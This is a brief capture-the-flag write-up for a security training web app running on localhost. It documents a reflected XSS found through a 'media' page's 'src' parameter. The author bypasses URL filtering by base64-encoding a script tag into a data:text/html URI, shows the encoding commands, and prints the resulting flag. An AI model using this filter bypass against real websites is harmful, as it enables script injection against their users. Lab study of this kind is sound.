Vulnerability name: Reflected XSS

How to defend: validate and sanitize input

a weirdly loaded image http://localhost:13080/index.php?page=media&src=1

after trying a million things

we can bypass the url encoding with base 64, and do an xss attack

```
➜  darklyProject git:(master) ✗ echo '<script>alert()</script>' | base64
PHNjcmlwdD5hbGVydCgpPC9zY3JpcHQ+Cg==
```

this gives us a double wrong answer as http://localhost:8080/?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgpPC9zY3JpcHQ+Cg==

but putting something in the alert

```
➜  darklyProject git:(master) ✗ echo '<script>alert("ok")</script>' | base64
PHNjcmlwdD5hbGVydCgib2siKTwvc2NyaXB0Pgo=
```

gets us the flag

```
The flag is : 928d819fc19405ae09921a2b71227bd9aba106f9d2d37ac412e9e5a750f1506d
```
